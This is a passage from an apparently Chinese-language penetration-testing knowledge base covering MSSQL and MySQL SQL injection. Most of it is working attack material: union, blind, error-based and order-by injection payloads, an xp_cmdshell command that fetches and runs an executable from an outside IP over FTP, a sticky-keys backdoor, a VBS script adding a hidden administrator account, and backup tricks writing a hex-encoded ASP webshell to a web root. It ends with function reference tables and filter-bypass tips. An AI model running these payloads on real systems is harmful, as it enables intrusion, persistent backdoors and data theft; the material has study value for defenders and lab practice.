123$ /add' -- 2）粘贴键替换 declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\explorer.exe' ,'c:\\windows\\system32\\sethc.exe'; declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\system32\\sethc.exe' ,'c:\\windows\\system32\\dllcache\\sethc.exe'; -- 需要同时具备sp_oacreate 和sp_oamethod 两个功能组件 -- 3）直接传马 DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, '%systemroot%\\system32\\cmd.exe /c echo open 222.180.210.113 > cmd.txt&echo 123>> cmd.txt&echo123>> cmd.txt&echo binary >> cmd.txt&echo get 1.exe >> cmd.txt&echo bye >> cmd.txt&ftp -s:cmd.txt&1.exe&1.exe&del cmd.txt. /q /f&del 1.exe /f /q'-- -- 4）启动项写入加账户脚本 declare @sp_passwordxieo int, @f int, @t int, @ret int exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\\RECYCLER\\1.vbs', 1 exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'os=\"WinNT://\"&wsnetwork.ComputerName' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&\"/Administrators,group\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(\"user\",\"123$\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword \"123\"' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&\"/123$\",user)' exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&\"/123$\"'; 5）如果该服务器有网站，则直接用方法4）写入一句话 参考链接 https://xz.aliyun.com/t/9475 https://xz.aliyun.com/t/8513 https://www.anquanke.com/post/id/86011 https://xie1997.blog.csdn.net/article/details/88679754 https://www.cnblogs.com/lishuyi/p/4111496.html https://blog.csdn.net/Fly_hps/article/details/80301792 https://xz.aliyun.com/t/7534 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 12:58:32 "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL 注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL 注入基础.html","title":"MSSQL 注入基础","keywords":"","body":"初始化环境 环境 版本 服务器 windows server 2003 sp2 web容器 IIS6.0 数据库 SQLServer 2000 personal 由于环境不太好找，这里使用Github大佬提供的一个MSSQL-SQLi-LABS作为环境依赖，MSSQL也是标准的关系型数据库，大多数注入方法都与MYSQL注入篇相似，但是MSSQL比MYSQL相对权限要更大，且在Windows域中只要有较高权限，就能影响域的安全，本篇只介绍基础注入知识，只谈针对MSSQL该如何注入 联合查询注入 页面将SQL语句返回的内容显示在了页面中(本例中是用户名、密码)，这种情况叫有回显的注入。 对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字union ，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序；注入流程 这里以mssql-sqli-labs less 1 举例确定字段段数量 使用order by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 正常页面： 错误页面： 判断数据库权限 // 判断是否是系统管理员 ?id=2' and 1=(select is_srvrolemember('sysadmin'))--+ // 判断是否是库权限 ?id=2' and 1=(select is_srvrolemember('db_owner'))--+ // 判断是否是 public 权限 ?id=2' and 1=(select is_srvrolemember('public'))--+ 判断页面回显位 根据上述判断的字段数量，使用union select 1,2,3,x... 将定义的数字显示在页面上，即可从中判断页面显示的字段位置。 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 在这里，我们可以看到，column2，column3 的类型是varchar，但是给的类型为int，所以在字符在转换为int类型的时候，会报错，在这里，如果无法判断，则使用null来代替显位，或者使用逐一判断字符类型 查询数据 通过第3步，找到显位之后，在显示字段位置使用子查询或直接查询，来查询数据； 首先通过db_name()查询当前数据库，数据库当前用户user，数据库版本@@version，服务器主机@@SERVERNAME 查询数据库 使用db_name()函数，传入数字类型就可以遍历所有的数据库 ?id=-1' union select 1,db_name(1),3--+ 或者查询master..sysdatabases来获取表名 ?id=-1' union select '1',name,'3' from master..sysdatabases--+ 当只能获取一个字段的时候，如下所示 由于mssql2000 没有concat函数（mssql 2012支持)，所以我们尝试使用如下payload，以此类推 ?id=-1' union select '1',name,'3' from master..sysdatabases where name != 'master' --+ ?id=-1' union select '1',name,'3' from master..sysdatabases where name not in ('master','model','msdb') --+ 或者 select catalog_name from information_schema.schemata; 查表 在获取了当前的数据库，此时需要获取当前数据库的表，使用current_database..sysobjects(此时current_database为test，所以为test..systobjects)，条件为U（用户表） // 查当前库的第一个表 ?id=-1' union select top 1 '1',name,3 from test..sysobjects where xtype='U'--+ // 查当前库的第一个表 select top 1 name from sysobjects where xtype='u' // 查当前数据库的第一个表 -- test.information_schema.tables 包含视图 而 test..sysobjects where xtype = 'U' 只包含用户创建的表 select top 1 table_name from information_schema.tables // 查询master库第一个表名，以此类推 select top 1 table_name from master.information_schema.tables 查字段 // 支持跨库查询 ?id=-2' union select top 1 1,name,'3' from test..syscolumns where id = (select id from test..sysobjects where name='users')--+ // 或者 ?id=-2' union select top 1 1,column_name,'3' from test.information_schema.columns where table_name = 'users'--+ // 或者,但是以下不支持跨库查询 ?id=-2' union select top 1 1,name,'3' from test..syscolumns where id = OBJECT_ID('users')--+ // 或者 ?id=-2' union select top 1 1,(select top 1 col_name(object_id('users'),1) from sysobjects),3--+ ?id=-2' union select top 1 1,(select top 1 col_name(object_id('users'),{i}) from sysobjects),3--+ 查值 在已知表名，列名的情况下，直接使用select 语句查询即可 ?id=-2' union select top 1 1,username,password from users--+ 盲注 布尔盲注 布尔盲注其实和mysql布尔盲注一样，通过页面对永真条件，or 1=1 与 永假条件，and 1=2 返回的内容是否存在差异，进行判断是否可以进行布尔盲注。通常返回存在/不存在两个结果，就可以判断是否存在布尔盲注 -- 语句如下，如果condition为真，那么整条语句 where 语句则恒真 select * from users where username=$username and (condition) and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substring() count() len() 同mysql，一般注入流程为 求闭合字符 求当前数据库长度 求当前数据库ascii码值 求表名的数量 求表名的长度 求表名的ascii码值 求列名的数量 求列名的长度 求列名的ascii码值 求字段的数量 求字段的长度 求字段的ascii码值 求当前数据库长度 select * from users where id = '1' and len(db_name()) = 4 --+ 依次求解当前数据库的ascii码值，如果能猜字符可以不用ascii函数 select * from users where id = '1' and ascii(substring(db_name(),1,1)) = 116 --+ 求当前数据库中表的个数 select * from users where id = '1' and 4 = (select count(*) from test..sysobjects where xtype='U')--+ -- test.information_schema.tables 包含视图 而 test..sysobjects where xtype = 'U' 只包含用户创建的表 select * from users where id = '1' and 6 = (select count(*) from test.information_schema.tables)--+ -- information_schema去除视图 select * from users where id = '1' and 4 = (select count(*) from test.information_schema.tables where table_type not in ('view'))--+ 求当前数据库表的长度 select * from users where id = '1' and 5 = (select top 1 len(name) from test..sysobjects where xtype='U')--+ -- 求第二个表 select * from users where id = '1' and 6 = (select top 1 len(name) from test..sysobjects where xtype='U' and len(name) not in(5))--+ -- 依次类推求完所有表的长度。。。 求当前数据库表的ascii码值 select * from users where id = '1' and 117 = ascii(substring((select top 1 name from test..sysobjects where xtype='u'),1,1))--+ -- 求第二个表的ascii码值 select * from users where id = '1' and 101 = ascii(substring((select top 1 name from test..sysobjects where xtype='u' and name not in ('users')),1,1))--+ -- 依次类推，分别求解 求当前数据库某表的列名个数 -- 以下支持跨库查询 select * from users where id = '1' and 3 = (select count(*) from test..syscolumns where id = (select id from test..sysobjects where name='users'))--+ -- 或 -- 以下只支持查询该库下的列，不支持跨库查询 select * from users where id = '1' and 3 = (select count(*) from test..syscolumns where id = object_id('users'))--+ 求当前数据库某表中列名的长度 select * from users where id = '1' and 2 = (select top 1 len(name) from test..syscolumns where id = object_id('users'))--+ -- 依次类推求各个字段的长度 select * from users where id = '1' and 8 = (select top 1 len(name) from test..syscolumns where id = object_id('users') and len(name) not in(2))--+ 求当前数据库某表中列名的ascii码值 -- 可跨库查询 select * from users where id = '1' and 105 = ascii(substring((select top 1 name from test..syscolumns where id = (select id from test..sysobjects where name='users')),1,1))--+ -- 不跨库查询，推荐以下 select * from users where id = '1' and 105 = ascii(substring((select top 1 col_name(object_id('users'),1) from sysobjects),1,1))--+ -- {i} 为第i 个字段 select * from users where id = '1' and 105 = ascii(substring((select top 1 col_name(object_id('users'),{i}) from sysobjects),1,1))--+ 求当前数据库某表字段的个数 select * from users where id = '1' and 13 = (select count(*) from users)--+ 求当前数据库user表username字段第一个值的长度 select * from users where id = '1' and 4 = (select top 1 len(username) from users)--+ -- 这里要是知道了id值，可以用where [condition] id 来代替 top 1 ... where len(username) not in (/\\d/) 求当前数据库user表username字段第一个值的ascii码值 select * from users where id = '1' and 68 = ascii(substring((select top 1 username from users),1,1))--+ -- 依次求解，使用top 1 ... where username/id... not in('Dumb')... 时间盲注 延时函数 waitfor delay WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。 如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。 语法： WAITFOR DELAY '0:0:n' 示例： WAITFOR DELAY '0:0:4' -- 表⽰延迟4秒 时间盲注通过页面返回的内容的响应时间差异进行条件判断，但是在mssql中，默认可使用堆叠查询，这个也是判断mssql与mysql的区别之一，所以在判断注入点有三种方式，如下： 直接带入查询 堆叠查询判断注入点 select * from users where id = '1';waitfor delay '0:0:3' if判断注入点 select * from users where id = '1' if (1=1) waitfor delay '0:0:4' select * from users where id = '1' if (1=2) waitfor delay '0:0:4' 通常使用if语句来查询数据，if语句中判断True,False同布尔注入 报错注入 报错注入通常情况下在服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。 convert() CONVERT()函数是把⽇期转换为新数据类型的通⽤函数。 CONVERT(data_type(length),data_to_be_converted,style) 注释 ： data_type(length) 转换为⽬标数据类型（带有可选的长度）。 data_to_be_converted 含有需要转换的值。 style 规定⽇期/时间的输出格式。 -- 示例 CONVERT(VARCHAR(19),GETDATE()) CONVERT(VARCHAR(10),GETDATE(),110) CONVERT(VARCHAR(11),GETDATE(),106) CONVERT(VARCHAR(24),GETDATE(),113) -- 结果 09 22 2021 11:39AM 09-22-2021 22 09 2021 22 09 2021 11:41:19:480 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样就能得到的这个SQL查询的结果了。如下所示 查数据库 select * from users where id = '1' and 1 = convert(int,db_name())--+ 查表名 select * from users where id = '1' and 1 = convert(int,(select top 1 name from test..sysobjects where xtype='u'))--+ 查列名 select * from users where id = '1' and 1 = convert(int,(select top 1 name from test..syscolumns where id = (select id test..sysobjects where name = 'users')))--+ 查值 select * from users where id = '1' and 1 = convert(int,(select top 1 username from users))--+ db_name() 此函数返回指定数据库的名称 DB_NAME ( [ database_id ] ) 名称DB_NAME将返回的数据库的标识号 (ID) 。如果调用DB_NAME省略database_id，则DB_NAME返回当前数据库的名称。 返回nvarchar(128) select * from users where id = '1' and 1 = db_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ file_name() 此函数返回给定文件标识 (ID) 号的逻辑文件名。 file_name(id) 其文件名的文件标识号FILE_NAME。file_id具有int数据类型。返回nvarchar(128) file_ID对应于 sys.master_files 目录视图或 sys.database_files 目录视图中的 file_id 列。 select * from users where id = '1' and 1 = file_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ filegroup_name() select * from users where id = '1' and 1 = filegroup_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ col_name() 此函数根据表列的表标识号和列标识号值返回表列的名称。 COL_NAME ( table_id , column_id ) table_id 自变量具有一个 int 数据类型,column_id 自变量具有一个 int 数据类型,返回系统名称 object_name() 返回架构范围内对象的数据库对象名称。 OBJECT_NAME ( object_id [, database_id ] ) object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象 database_id 的数据类型为 int。要在其中查找对象的数据库的 ID 返回sysname type_name() 返回指定类型 ID 的未限定的类型名称。 TYPE_NAME ( type_id ) type_id type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。返回sysname cast() 将表达式由一种数据类型转换为另一种数据类型。 CAST ( expression AS data_type [ ( length ) ] ) expression 任何有效的表达式。 data_type 目标数据类型。 这包括 xml、bigint 和sql_variant 。 不能使用别名数据类型。 length 指定目标数据类型长度的可选整数，适用于允许用户指定长度的数据类型。 默认值为 30。 style 指定 CONVERT 函数将如何转换 expression 的整数表达式。 对于 NULL 的样式值，则返回 NULL。 data_type 确定范围。\\ 返回转换为 data_type 的 expression 。 select * from users where id = '1' and 1 = cast((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')) as varchar)--+ schema_name() 返回与架构 ID 关联的架构名称。 SCHEMA_NAME ( [ schema_id ] ) schema_id 架构的 ID。 schema_id 是 int。如果没有定义 schema_id，则 SCHEMA_NAME 将返回调用方的默认架构的名称。 schema_id 不是有效 ID 时，返回 NULL。 此处由于本地测试环境不支持该函数，故不做演示，类似相关的类型转换的函数还有很多，就不一一列出来了 >、 这其实也是利用了类型不匹配来报错注入数据 select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) > 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) = 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) having 1=1 爆表名 having 需要与聚合函数group by 一起使用，当无group by 时，会直接爆出当前表，如下所示： group by ... having 1=1 爆列名 order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 判断order by 注入点 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 开启错误提示 当开启了错误提示的情况下，可以使用报错注入的方式，在order by 之后使用报错注入的函数来爆出数据 select * from users order by convert(int,db_name)--+ 关闭错误提示 当关闭了错误提示的情况下，可以考虑使用时间盲注来注出数据 时间盲注方式如上盲注篇查看 堆叠注入 MSSQL 默认是可以多语句查询，其与mysql不同的是，MSSQL非常灵活，且可执行系统命令，当存在堆叠查询的语句中，就可以考虑执行系统命令，写入webshell，远程下载木马文件，执行命令getshell等等。 二次注入 场景见MySQL注入基础二次注入 HTTP头部注入 见MySQL注入基础HTTP头部注入 文件操作 MSSQL的文件操作要求要有两大前提： 有相应的权限db_owner 知道文件的绝对路径 在mssql中有两个存储过程可以帮我们来找绝对路径：xp_cmdshell和 xp_dirtree 利用xp_dirtree方法来寻找 execute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录 execute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中 CREATE TABLE tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1; 使用xp_cmdshell查找绝对路径 cmd中寻找某文件 for /r c:\\ %i in (*.asp) do echo %i 需要建立一个表存一个char字段就可以了 读 读取文件可以创建一个临时表，将本地文件写入该表中（无法远程登录的情况下，使用堆叠注入） --建立一个临时表 create table #testtable( context ntext ); select * from #testtable --将本地文件写入表中 BULK INSERT #testtable FROM 'c:/1.txt' WITH ( DATAFILETYPE = 'char', KEEPNULLS ) --drop table #testtable; xp_cmpshell执行dos命令，在知道绝对路径的情况下读取文件 exec master..xp_cmdshell 'type c:\\\\1.txt' 写 xp_cmdshell 写入webshell 在得知绝对路径的情况下，使用echo 写入webshell，如果需要换行则使用>>追加写入，注意如=、> 等前使用^来转义 exec master..xp_cmdshell 'echo ^> C:\\Inetpub\\wwwroot\\sqlilabs\\test.asp' 或者使用远程下载 certutil.exe -urlcache -split -f \"\" web_absolute_path/xxx.asp curl -o web_absolute_path/xxx.asp powershell -c \"invoke-webrequest -uri -outfile web_absolute_path/xxx.asp\" DB_owner权限LOG备份Getshell 无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马 SQLServer常见的备份策略： 每周一次完整备份 每天一次差异备份 每小时一次事务日志备份 利用前提： 目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式 知道网站的绝对路径 该注入支持堆叠注入alter database 数据库名 set RECOVERY FULL; #修改数据库恢复模式为 完整模式 create table cmd (a image); #创建一张表cmd，只有一个列 a，类型为image backup log 数据库名 to disk= 'C:\\Inetpub\\wwwroot\\sqlilabs\\1.asp' with init; #备份表到指定路径 insert into cmd (a) values(0x3c256576616c20726571756573742822636d642229253e); #插入一句话到cmd表里 backup log 数据库名 to disk='C:\\Inetpub\\wwwroot\\sqlilabs\\2.asp'; #把操作日志备份到指定文件 drop table cmd; #删除cmd表 第四行的 0x3c256576616c20726571756573742822636d642229253e是一句话木马 的16进制表示 执行完成之后会在目标网站根目录下生成1.asp和2.asp文件，其中1.asp 保存数据库，2.asp就是我们需要连接的木马文件 DB_owner权限差异备份Getshell 注：差异备份有概率会把网站搞崩，所以不建议使用差异备份 利用前提： 知道网站的绝对路径 该注入支持堆叠注入 注：以下语句一条一条执行 create table [dbo].[test] ([cmd] [image]) insert into [test](cmd) values(0x3c256576616c20726571756573742822636d642229253e) backup database test to disk = 'C:\\Inetpub\\wwwroot\\1.asp' Drop table [test] 第2行的0x3c256576616c20726571756573742822636d642229253e 是一句话木马 的16进制表示 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-03 14:41:56 "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html","title":"MSSQL常见符号函数符号归类","keywords":"","body":"符号 注释符 注释符 释义 -- SQL注释风格 ;%00 空字节 /* C注释风格 常用运算符 运算符 释义 + 加法运算 - 减法运算 * 乘法运算 / 除法运算 % 取模运算 & 位与逻辑运算 | 位或逻辑运算 ... ... 常见全局变量 变量 释义 @@VERSION SQL Server 版本 @@SEVERNAME 运行SQL Server 的本地服务器名称 函数 系统函数信息 函数 释义 DB_NAME() 获取当前数据库名 USER_NAME() / USER 获取用户在数据库中的名字 is_srvrolemember('sysadmin')is_srvrolemember('db_owner')is_srvrolemember('public') 判断当前用户权限 进制转换 函数 释义 ASCII(str) 返回字符表达式最左端字符的ASCII 码值 CHAR(str) 将ASCII 码转换为字符 cast(16 as VARBINARY(50)) 将16转换为16进制 CONVERT(VARBINARY(50),16) 将16转换为16进制 master.dbo.fn_varbintohexstr(16) 将16转换为16进制 STR(n) 将数值型数据转为字符型数据 字符串操作函数 函数 释义 SUBSTRING (， ，length) 返回从字符串左边第starting_ position 个字符起length个字符的部分。 LEFT (， ) 返回character_expression 左起 integer_expression 个字符。 RIGHT (， ) 返回character_expression 右起 integer_expression 个字符 QUOTENAME (expression’>[， quote character]) 返回被特定字符括起来的字符串。 REPLICATE (character_expression,integer_expression) 返回一个重复character_expression 指定次数的字符串。 REVERSE () 将指定的字符串的字符排列顺序颠倒 REPLACE (， ， ) 用string_expression3 替换在string_expression1 中的子串string_expression2。 SPACE () 返回一个有指定长度的空白字符串。 STUFF (，， ，) 用另一子串替换字符串指定位置、长度的子串。 LEFT (， ) 返回character_expression 左起 integer_expression 个字符。 RIGHT (， ) 返回character_expression 右起 integer_expression 个字符。 CHARINDEX (， ) 返回字符串中某个指定的子串出现的开始位置其中substring _expression 是所要查找的字符表达式，expression 可为字符串也可为列名表达式。如果没有发现子串，则返回0 值。此函数不能用于TEXT 和IMAGE 数据类型。 PATINDEX (， ) 其中子串表达式前后必须有百分号“%”否则返回值为0。返回字符串中某个指定的子串出现的开始位置。与CHARINDEX 函数不同的是，PATINDEX函数的子串中可以使用通配符，且此函数可用于CHAR、 VARCHAR 和TEXT 数据类型。 CONCAT 连接字符串函数，MSSQL 2012+ 支持 其他函数/语句 函数/语句 释义 IF...ELSE... 条件语句 case when exp then state1 ELSE state2 end 条件语句 WAITFOR DELAY '0:0:n' 延迟n s LEN(str) 计算字符串长度 LOWER(str) 将字符串的大写字母全部转成小写 UPPER(str) 将字符串的小写字母全部转成大写 LTRIM() 字符串头部的空格去掉 RTRIM() 把字符串尾部的空格去掉 常见SQL语句 获取数据库权限 select is_srvrolemember('sysadmin') select is_srvrolemember('db_owner') select is_srvrolemember('public') 获取系统相关信息 -- 获取版本 select @@version; -- 获取用户名 select user; -- 获取服务器主机名 select @@servername; 获取数据库 -- 当前数据库 select db_name(); -- 其他数据库,n为number类型 select db_name(n); -- 所有数据库 select name from master..sysdatabases; 获取表 select name from test..sysobjects where xtype = 'u' -- 或者 -- 每个库都有information_schema，可以不用加test，也支持跨库查，需要注意这样查询出来使用视图的 select table_name from test.information_schema.tables -- 从当前库获取表，去除视图 select table_name from information_schema.tables where table_type not in ('view'); 获取字段 select name from test..syscolumns where id = (select id from test..sysobjects where name = 'users') -- 或者 select column_name from test.information_schema.columns where table_name = 'users'; --或者，以下不支持跨库查询 select top 1 col_name(object_id('users'),1) from sysobjects; -- i 为第几个字段，int型 select top 1 col_name(object_id('users'),i) from sysobjects; 获取值 select username, password from users; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 10:56:43 "},"知识库/01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html","title":"常见防御手段及绕过方式","keywords":"","body":"实战中遇到的mssql很少，也没有成体系的绕过手法，大多与mysql的绕过一样，但是得注意SQL语句的写法。 and / or 被过滤 双写 大小写 内联注释 编码 unicode utf-8 url 空格 被过滤/拦截 括号 + 注释符 空白字符(%01-%20) 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 系统关键字(SELECT，WHERE，UNION...)被过滤/拦截 注释符绕过 大小写绕过 内联注释法绕过 双写 比较符(> between a and b 等号 被过滤/拦截 like > 引号被过滤/拦截 进制转换（通常十六进制） 注释符 被过滤/拦截 手动闭合 id=1' or '1'='1 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:02:36 "},"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL.html","title":"MYSQL","keywords":"","body":"MySQL 简介 MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL 是开源的，目前隶属于 Oracle 旗下产品。 MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。 MySQL 使用标准的 SQL 数据语言形式。 MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。 MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。 MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。 MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 版本区别 这里只讨论大版本的区别 版本 区别 5.0 以下 单用户模式，无information_schema库，需要猜解注入 5.0及5.0以上 多用户模式，存在information_schema库，其包含了MySQL的所有表，视图等 SQL基本语法 在MySQL数据库中，常见对数据进行处理的操作有：增，删，改，查，对应的SQL语句以及操作内容分别是： 增 ，增加数据，通常在SQL语句中，其简单结构通常可以表示为： INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 删，删除数据，通常在SQL语句中，其简单结构通常可以表示为： DELETE FROM table_name [WHERE Clause] 改，更新数据，通常在SQL语句中，其简单结构通常可以表示为： UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause] 查，查询数据，通常在SQL语句中，其简单结构可以表示为： SELECT column_name,column_name FROM table_name [WHERE Clause] [LIMIT N][ OFFSET M] 参考链接 https://xz.aliyun.com/t/7169# https://blog.sari3l.com/posts/9622f295/ https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-114 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 12:59:33 "},"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html","title":"MYSQL常见符号函数语句归类","keywords":"","body":"常用符号 注释符 注释符 说明 #url编码:%23在URL中#表示锚点，也就是hash路由，带上#不会请求后端路由，而是刷新前端路由 单行注释 -- xx为任意字符，这里表示有一个空格 单行注释 /**/ 多行(内联)注释 常用运算符 运算符 说明 && 同 and || 同 or ! 同 not ^ 异或，同xor \\ 转义符 ~ 一元比特反转 + 加，可替代空格 常见全局变量 变量 说明 @@VERSION 返回版本信息 @@GLOBAL.VERSION 同@@VERSION @@HOSTNAME 返回安装的计算机名称 @@BASEDIR 返回MYSQL绝对路径 常用函数 系统函数信息 函数 说明 USER() 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。 DATABASE() 获取当前选择的数据库名，同SCHEMA() VERSION() 获取当前版本信息。 进制转换 函数 说明 ORD(str) 返回字符串第一个字符的ASCII值。 OCT(N) 以字符串形式返回 N 的八进制数，N 是一个BIGINT 型数值，作用相当于CONV(N,10,8)。 HEX(N_S) 参数为字符串时，返回 N_or_S 的16进制字符串形式，为数字时，返回其16进制数形式。 UNHEX(str) HEX(str) 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。 BIN(N) 返回十进制数值 N 的二进制数值的字符串表现形式。 ASCII(str) 同ORD(string)。 CONV(N,from_base,to_base) 将数值型参数 N 由初始进制 from_base 转换为目标进制 to_base 的形式并返回。 CHAR(N,... [USING charset_name]) 将每一个参数 N 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。 字符串截取/拼接 函数 说明 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为SUBSTRING的简单版。 SUBSTRING()SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)。 多种格式SUBSTRING(str,pos)、 RIGHT(str,len) 对指定字符串从最右边截取指定长度。 LEFT(str,len) 对指定字符串从最左边截取指定长度。 RPAD(str,len,padstr) 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 LPAD(str,len,padstr) 与RPAD相似，在str左边补齐。 MID(str,pos,len) 同于 SUBSTRING(str,pos,len)。 INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 CONCAT(str1,str2...) 函数用于将多个字符串合并为一个字符串 GROUP_CONCAT(...) 返回一个字符串结果，该结果由分组中的值连接组合而成。 MAKE_SET(bits,str1,str2,...) 根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))。 其他常见函数 函数/语句 说明 IF(exp,state1,state2) 条件语句，exp为true，执行state1，否则执行state2 CASE...WHEN exp THEN state1 ELSE state2 END 同IF SLEEP(N) 休眠N秒 BENCHMARK(count,exp)： 执行表达式exp，count次（消耗CPU） LENGTH(str) 返回字符串的长度。 PI() 返回π的具体数值。 REGEXP \"statement\" 正则匹配数据，返回值为布尔值。 LIKE \"statement\" 匹配数据，%代表任意内容。返回值为布尔值。 RLIKE \"statement\" 与regexp相同。 LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置。 POSITION(substr IN str) 等同于 